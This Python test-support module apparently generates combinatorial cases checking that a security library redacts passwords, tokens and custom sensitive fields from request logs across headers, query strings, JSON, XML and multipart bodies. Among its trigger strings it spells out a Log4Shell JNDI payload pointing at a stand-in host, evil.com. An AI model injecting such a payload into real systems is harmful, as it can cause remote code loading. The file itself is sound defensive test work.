from typing import Any

import tests.test_sensitive_data_invariant as INV_ASYNC
from guard_core._utils.request_logging import (
    _DEFAULT_SENSITIVE_LOG_FIELDS,
    _DEFAULT_SENSITIVE_LOG_HEADERS,
)

EXCLUDED_HEADER_NAME = "x-custom-excluded"

CUSTOM_PARAM = INV_ASYNC._CUSTOM_SENSITIVE_PARAM
CUSTOM_BODY_FIELD = INV_ASYNC._CUSTOM_SENSITIVE_BODY_FIELD
CUSTOM_HEADER = INV_ASYNC._CUSTOM_SENSITIVE_HEADER

NAME_POOL = sorted(
    set(_DEFAULT_SENSITIVE_LOG_HEADERS)
    | set(_DEFAULT_SENSITIVE_LOG_FIELDS)
    | {CUSTOM_PARAM, CUSTOM_BODY_FIELD, CUSTOM_HEADER}
)

_XSS = INV_ASYNC._XSS
_SQLI = INV_ASYNC._SQLI
_LOG4SHELL = "${jndi:ldap://evil.com/a}"
TRIGGER_TEXT = {"xss": _XSS, "sqli": _SQLI, "log4shell": _LOG4SHELL}

ASSIGN_MAP = {"eq": "=", "colon": ":", "colon_space": ": ", "double_eq": "=="}
WHITESPACE_MAP = {
    "none": ("", ""),
    "before": (" ", ""),
    "after": ("", " "),
    "both": (" ", " "),
    "tab_before": ("\t", ""),
    "escaped_tab_before": ("\\t", ""),
    "escaped_newline_before": ("\\n", ""),
    "escaped_cr_before": ("\\r", ""),
    "escaped_hex_tab_before": ("\\x09", ""),
    "escaped_unicode_space_before": ("\\u0020", ""),
    "escaped_quote_before": ('\\"', ""),
    "escaped_nul_before": ("\\0", ""),
    "escaped_octal_tab_before": ("\\011", ""),
    "escaped_upper_hex_tab_before": ("\\X09", ""),
    "escaped_long_unicode_tab_before": ("\\U00000009", ""),
    "escaped_named_tab_before": ("\\N{TAB}", ""),
}
SEPARATOR_MAP = {
    "amp": "&",
    "semicolon": ";",
    "question": "?",
    "comma": ",",
    "newline": "\n",
    "tab": "\t",
    "space": " ",
    "crlf": "\r\n",
    "pipe": "|",
    "cr": "\r",
    "nbsp": " ",
    "ideographic_space": "　",
    "vtab": "\v",
}
SOFT_SEPARATORS = {"space", "tab", "nbsp", "ideographic_space", "vtab"}

SURFACES = [
    "header",
    "cookie_header",
    "excluded_header",
    "query_param",
    "url_query_string",
    "url_fragment",
    "url_path_segment",
    "matrix_param",
    "form_field",
    "multipart_text",
    "multipart_filename",
    "multipart_filename_and_text",
    "json_shallow",
    "json_deep",
    "json_array_shallow",
    "json_array_deep",
    "json_in_header",
    "json_in_query",
    "json_in_query_pct_encoded",
    "text_plain",
    "xml_body",
]

HEADER_OR_BODY_SURFACES = {
    "header",
    "cookie_header",
    "excluded_header",
    "json_in_header",
    "form_field",
    "multipart_text",
    "multipart_filename",
    "multipart_filename_and_text",
    "json_shallow",
    "json_deep",
    "json_array_shallow",
    "json_array_deep",
    "text_plain",
    "xml_body",
}

AXES_POOLS: dict[str, list[Any]] = {
    "name": NAME_POOL,
    "casing": ["lower", "upper", "mixed"],
    "assign": ["eq", "colon", "colon_space", "double_eq"],
    "whitespace": list(WHITESPACE_MAP.keys()),
    "position": ["first", "second", "third"],
    "separator": list(SEPARATOR_MAP.keys()),
    "quoting": ["none", "double", "single"],
    "wrapper": ["bare", "nested_data", "filename", "json_leaf", "xml", "xml_attr"],
    "pct": [(0, "none")]
    + [(r, t) for r in (1, 2, 3) for t in ("whole", "equals", "separator")],
    "trigger": ["xss", "sqli", "log4shell"],
    "name_suffix": ["none", "plus"],
    "value_mode": ["normal", "empty_split"],
    "secret_shape": ["plain", "inner_space_eq"],
}
AXIS_ORDER = list(AXES_POOLS.keys())
BASELINE_AXES = {
    "name": "password",
    "casing": "lower",
    "assign": "eq",
    "whitespace": "none",
    "position": "first",
    "separator": "amp",
    "quoting": "none",
    "wrapper": "bare",
    "pct": (0, "none"),
    "trigger": "xss",
    "name_suffix": "none",
    "value_mode": "normal",
    "secret_shape": "plain",
}

AXIS_ABBR = {
    "name": "nm",
    "casing": "cs",
    "assign": "as",
    "whitespace": "ws",
    "position": "po",
    "separator": "sp",
    "quoting": "qt",
    "wrapper": "wr",
    "pct": "pc",
    "trigger": "tr",
    "name_suffix": "ns",
    "value_mode": "vm",
    "secret_shape": "sh",
}


def gated_pool(axis: str, surface: str) -> list[Any]:
    pool = AXES_POOLS[axis]
    if axis == "trigger":
        return (
            pool
            if surface == "excluded_header"
            else [t for t in pool if t != "log4shell"]
        )
    if axis == "name_suffix":
        return pool if surface in HEADER_OR_BODY_SURFACES else ["none"]
    return pool


def variant_for_surface(surface: str) -> str:
    return "excluded_header" if surface == "excluded_header" else "default"


def axis_value_str(axis: str, value: str | tuple[int, str]) -> str:
    if axis == "pct":
        assert isinstance(value, tuple)
        rounds, target = value
        return f"{rounds}-{target}"
    return str(value)


def case_id_for(surface: str, axes: dict[str, Any]) -> str:
    bits = [surface]
    for axis in AXIS_ORDER:
        bits.append(f"{AXIS_ABBR[axis]}.{axis_value_str(axis, axes[axis])}")
    return "_".join(bits)


def secret_for(case_id: str, axes: dict[str, Any]) -> str:
    base = f"SECRET-{case_id}"
    if axes.get("secret_shape") == "inner_space_eq":
        return f"{base}~K=V X"
    return base
